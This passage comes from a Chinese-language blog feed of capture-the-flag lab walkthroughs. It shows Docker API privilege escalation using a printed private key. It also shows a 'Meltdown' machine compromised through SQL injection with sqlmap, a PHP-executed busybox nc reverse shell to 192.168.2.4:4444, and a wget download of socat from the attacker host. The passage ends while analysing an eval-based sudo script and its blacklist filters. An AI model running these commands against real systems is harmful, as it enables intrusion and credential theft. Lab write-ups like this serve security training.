Xd2KdYdhSt/9KX35nACuA3LmaQ/kWqg7YR1Z5BIgU59TjBzd<br>tg42KTaIEzT6TlCk0qaaEnmMSEQtz0sTEP0K7D6xXUIMKuhItSmeWVk1D03xXjk5<br>Vja1/BZZzLXtgUxB08JBouHhoKKhUBvM59hQkHTKFg3G+upBeMSNIU5Yc9V4fD6n<br>3E1Ay7xWE8V3z2L6TrcSN0B/8NHfgYqSf8TJfyi5AoIBAHyCkEYYP2aNpAhvLP+K<br>te32CRXt5c6Vz49B6m5yKgY0JGxWCabaeLfYTOvARWeihAZ0eWKjWns4FwdWnkm7<br>6oFz1m6HfYSPLy/5S98ql2lgskyXaZwDozAo4q6OYwDOHa5JB6QJYO8L5ONmVTdh<br>PzC7K2uoxzFjExTUAryh/BFIziOSfWQn/LmmCvBOc4EA7CA9azc9uJ+B6g0nFdFV<br>31TjKjXZwjoN53jUTybqXfHvFgBxvfPUXCI7wFEPMELkSC4hgcuVW23OjM/2DzWN<br>xFH1qFNsVMpPaPgZh1JC5GAHotFpAOf2bJ+whYUz0MvDhe8+QKXxet5dyP3CBFhw<br>1+0CggEBAKmBk9O/AQ4CEPrPulo8AOgQiVhBrZQHCQi/IoAvR8WcXKwLqX2hEzzw<br>MX1y9SrBDFQIlbquvc1AfwdBRFFK3OflyZTOYkm8ADOvC4GdzNEi/xdjRxnF3G69<br>w4qxU0JvBmaDrxytibez2zVZELvmdDLyk+DDW5sI8Jf8myyJQwL3BPlMzjBLWNrQ<br>XT+ZragkDPNz8BxRCCUTD0Ubb1Agzv99NRa4AW8PvIMvX6GIgws6A/KC10ZYYACY<br>vygpp6HwA7FqqhO7O3sbZXG62S6Kg9dsm1jWS5t2Nnp8m1XWbynjeDIh3A/XVcOE<br>V1Pdrh+BgWgBTYRDT0bBEUMoxEUpgwo=<br>-----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>给出了docker api的认证凭证，那么就可以操作dockerapi<br>查看监听的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -alnpt<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:2376          0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -<br>tcp        0     54 192.168.2.32:37271      192.168.2.4:4444        ESTABLISHED 3233/sh<br>tcp        9      0 127.0.0.1:9000          127.0.0.1:33776         CLOSE_WAIT  -<br>tcp        0      0 :::22                   :::*                    LISTEN      -<br>tcp        0      0 :::8000                 :::*                    LISTEN      -<br></code></pre></td></tr></table></figure><p>先转发一下端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.2.4:800/socat<br><span class="hljs-built_in">ls</span> -la<br>total 372<br>drwxrwxrwt    4 root     root           100 Jan  7 17:23 .<br>drwxr-xr-x   21 root     root          4096 Jun  3  2025 ..<br>drwxrwxrwt    2 root     root            40 Jan  7 15:38 .ICE-unix<br>drwxrwxrwt    2 root     root            40 Jan  7 15:38 .X11-unix<br>-rw-r--r--    1 nobody   nobody      375176 Jan  7 17:23 socat<br><span class="hljs-built_in">chmod</span> +x socat<br>./socat TCP-LISTEN:2377,fork,<span class="hljs-built_in">bind</span>=0.0.0.0 TCP:127.0.0.1:2376 &amp;<br></code></pre></td></tr></table></figure><p>对接口进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@miao:/tmp/certs# docker --tls --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=tcp://192.168.2.32:2377 version<br>Client:<br> Version:           27.5.1<br> API version:       1.47<br> Go version:        go1.22.2<br> Git commit:        27.5.1-0ubuntu3~22.04.2<br> Built:             Mon Jun  2 12:18:38 2025<br> OS/Arch:           linux/amd64<br> Context:           default<br><br>Server:<br> Engine:<br>  Version:          28.3.3<br>  API version:      1.51 (minimum version 1.24)<br>  Go version:       go1.24.11<br>  Git commit:       bea959c7b793b32a893820b97c4eadc7c87fabb0<br>  Built:            Tue Dec  2 23:05:51 2025<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v2.1.5<br>  GitCommit:        fcd43222d6b07379a4be9786bda52438f0dd16a1<br> runc:<br>  Version:          1.3.4<br>  GitCommit:        d842d7719497cc3b774fd71620278ac9e17710e0<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        <br></code></pre></td></tr></table></figure><p>查看docker镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@miao:/tmp/certs# docker --tls --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=tcp://192.168.2.32:2377 ps -a<br>CONTAINER ID   IMAGE          COMMAND                   CREATED       STATUS       PORTS                                       NAMES<br>f59b9418f1ad   laravel-vuln   <span class="hljs-string">&quot;docker-php-entrypoi…&quot;</span>   10 days ago   Up 2 hours   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp   hardcore_keller<br></code></pre></td></tr></table></figure><p>进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@miao:/tmp/certs# docker --tls --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=tcp://192.168.2.32:2377 run -v /:/mnt --<span class="hljs-built_in">rm</span> -it laravel-vuln <span class="hljs-built_in">chroot</span> /mnt sh<br>/ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br></code></pre></td></tr></table></figure><h1 id="四、查看FLAG"><a href="#四、查看FLAG" class="headerlink" title="四、查看FLAG"></a>四、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ <span class="hljs-comment"># cat /root/root.txt /home/alice/user.txt </span><br>flag&#123;root-ede49d353365dfcf95b6bf8df1b7a2dc&#125;<br>flag&#123;user-0e5b3d83a8c1221b25d34e824decc1e7&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cms-Laravel</tag>
      
      <tag>CVE-2021-3129</tag>
      
      <tag>提权-docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Meltdown</title>
    <link href="/Maze-sec/Meltdown/"/>
    <url>/Maze-sec/Meltdown/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 10:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00049s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00040s latency).<br>MAC Address: 08:00:27:02:7F:AE (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.243<br>Host is up (0.00087s latency).<br>MAC Address: 08:00:27:01:78:BE (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.19 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.243</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.243                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 10:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.243<br>Host is up (0.00019s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:01:78:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 32.56 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.243 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 10:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.243<br>Host is up (0.00066s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: \xE7\x82\x89\xE5\xBF\x83\xE8\x9E\x8D\xE8\xA7\xA3<br>MAC Address: 08:00:27:01:78:BE (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.81 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.243                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 10:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.243<br>Host is up (0.00085s latency).<br>All 100 scanned ports on 192.168.2.243 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 51 closed udp ports (port-unreach), 49 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:01:78:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.60 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><p>访问80端口，发现需要进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601051103956.png"></p><p>同时查看物品列表，提示我们可以执行里面的内容<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601051105294.png"></p><h2 id="1、SQL注入"><a href="#1、SQL注入" class="headerlink" title="1、SQL注入"></a>1、SQL注入</h2><p>访问<code>index.php</code>，找到物品展示，在后面加上<code>&#39;</code>后报错<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601051106753.png"></p><p>确定存在<code>sql注入</code>漏洞，直接使用sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.243/item.php?id=1&quot;</span> --dbs <br>available databases [5]:<br>[*] information_schema<br>[*] mysql<br>[*] performance_schema<br>[*] sys<br>[*] target<br><br><span class="hljs-comment">#查看数据库target存在的表格</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.243/item.php?id=1&quot;</span> -columns -D target   <br><br>Database: target<br>Table: characters<br>[3 columns]<br>+-------------+--------------+<br>| Column      | Type         |<br>+-------------+--------------+<br>| description | text         |<br>| name        | varchar(100) |<br>| <span class="hljs-built_in">id</span>          | int(11)      |<br>+-------------+--------------+<br><br>Database: target<br>Table: <span class="hljs-built_in">users</span><br>[3 columns]<br>+----------+-------------+<br>| Column   | Type        |<br>+----------+-------------+<br>| <span class="hljs-built_in">id</span>       | int(11)     |<br>| password | varchar(50) |<br>| username | varchar(50) |<br>+----------+-------------+<br><br>Database: target<br>Table: items<br>[3 columns]<br>+-------------+--------------+<br>| Column      | Type         |<br>+-------------+--------------+<br>| description | text         |<br>| name        | varchar(100) |<br>| <span class="hljs-built_in">id</span>          | int(11)      |<br>+-------------+--------------+<br><br><span class="hljs-comment">#查看username和password</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.2.243/item.php?id=1&quot;</span> -columns -D target -T <span class="hljs-built_in">users</span> --dump<br><br>Database: target<br>Table: <span class="hljs-built_in">users</span><br>[3 columns]<br>+----------+-------------+<br>| Column   | Type        |<br>+----------+-------------+<br>| <span class="hljs-built_in">id</span>       | int(11)     |<br>| password | varchar(50) |<br>| username | varchar(50) |<br>+----------+-------------+<br><br>Database: target<br>Table: <span class="hljs-built_in">users</span><br>[1 entry]<br>+----+----------+----------+<br>| <span class="hljs-built_in">id</span> | password | username |<br>+----+----------+----------+<br>| 1  | rin123   | rin      |<br>+----+----------+----------+<br></code></pre></td></tr></table></figure><p>找到用户名和密码<code>rin:rin123</code></p><p>登录成功后，发现可以修改商品的介绍<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601051112440.png"></p><p>经过测试物品介绍这里输入的内容可以当做php代码执行。将物品介绍修改为phpinfo()；<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601051114583.png"></p><h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>确定可以当做php代码执行，尝试反弹shell<br>修改物品内容为：<code>system(&#39;busybox nc 192.168.2.4 4444 -e sh&#39;);</code><br>然后访问物品列表，成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.243] 50550<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1、获取rin权限"><a href="#1、获取rin权限" class="headerlink" title="1、获取rin权限"></a>1、获取rin权限</h2><p>查看<code>/opt</code>目录下，发现存在<code>passwd.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meltdown:/home$ <span class="hljs-built_in">cat</span> /opt/passwd.txt <br>rin:b59a85af917afd07<br></code></pre></td></tr></table></figure><p>找到用户<code>rin</code>的密码<code>b59a85af917afd07</code></p><p>切换到用户<code>rin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meltdown:/home$ su rin<br>Password: <br>rin@meltdown:/home$ <span class="hljs-built_in">id</span><br>uid=1000(rin) gid=1000(rin) <span class="hljs-built_in">groups</span>=1000(rin)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> rin on meltdown:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User rin may run the following commands on meltdown:<br>    (root) NOPASSWD: /opt/repeater.sh<br></code></pre></td></tr></table></figure><p>发现<code>rin</code>可以以<code>root</code>权限执行<code>/opt/repeater.sh</code>脚本</p><p>查看脚本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">rin@meltdown:~$ <span class="hljs-built_in">cat</span> /opt/repeater.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> user_input=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[;&amp;|`$\\]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含非法字符&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qiE <span class="hljs-string">&#x27;(cat|ls|echo|rm|mv|cp|chmod)&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含危险关键字&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br>    <br>   <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[[:space:]]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> ! <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;^[a-zA-Z0-9]*[[:space:]]+[a-zA-Z0-9]*$&#x27;</span>; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：空格使用受限&quot;</span><br>            <span class="hljs-built_in">return</span> 1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br>    <br>   <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;处理结果: <span class="hljs-variable">$user_input</span>&quot;</span><br>    <br>   <br>    <span class="hljs-built_in">local</span> sanitized_input=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n\r&#x27;</span>)<br>    <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;output=\&quot;<span class="hljs-variable">$sanitized_input</span>\&quot;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;最终输出: <span class="hljs-variable">$output</span>&quot;</span><br>&#125;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -ne 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;用法: <span class="hljs-variable">$0</span> &lt;输入内容&gt;&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>main <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br></code></pre></td></tr></table></figure><p><strong>1、过滤黑名单字符</strong><br>过滤了 <code>; &amp; | $ \</code> 等字符，避免命令拼接、执行多条命令或命令替换玩法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qE <span class="hljs-string">&#x27;[;&amp;|`$\\]&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含非法字符&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p><strong>2、过滤关键字</strong><br>这里只是过滤了一些简单命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user_input</span>&quot;</span> | grep -qiE <span class="hljs-string">&#x27;(cat|ls|echo|rm|mv|cp|chmod)&#x27;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：输入包含危险关键字&quot;</span><br>        <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p><strong>3、空格限制</strong><br>过滤了空格，但是允许特定形式的空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span 